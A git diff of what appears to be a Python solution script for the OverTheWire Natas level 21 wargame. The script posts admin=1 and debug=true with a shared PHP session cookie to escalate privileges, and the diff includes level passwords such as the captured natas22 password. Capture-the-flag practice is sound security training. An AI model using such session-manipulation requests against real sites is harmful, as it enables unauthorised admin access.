@@ -12,12 +12,12 @@ def writeResponse(enumerate = ''):
         
 
 url = 'http://natas21-experimenter.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas21','IFekPyrQXftziDEsUr3x21sYuahypdgJ')
+lvl_pass = requests.auth.HTTPBasicAuth('natas21','89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')
 my_cookies = {"PHPSESSID":'iingj5ruhsj7k4b80kh7s35m30'}
 my_params = {"submit":"true","admin":"1","debug":"true"}
 
 res, soup = make()
-writeResponse('-experimenter')
+
 
 url = 'http://natas21.natas.labs.overthewire.org'
 
@@ -30,5 +30,5 @@ writeResponse()
 easy as pie
 
 Username: natas22
-Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
 '''
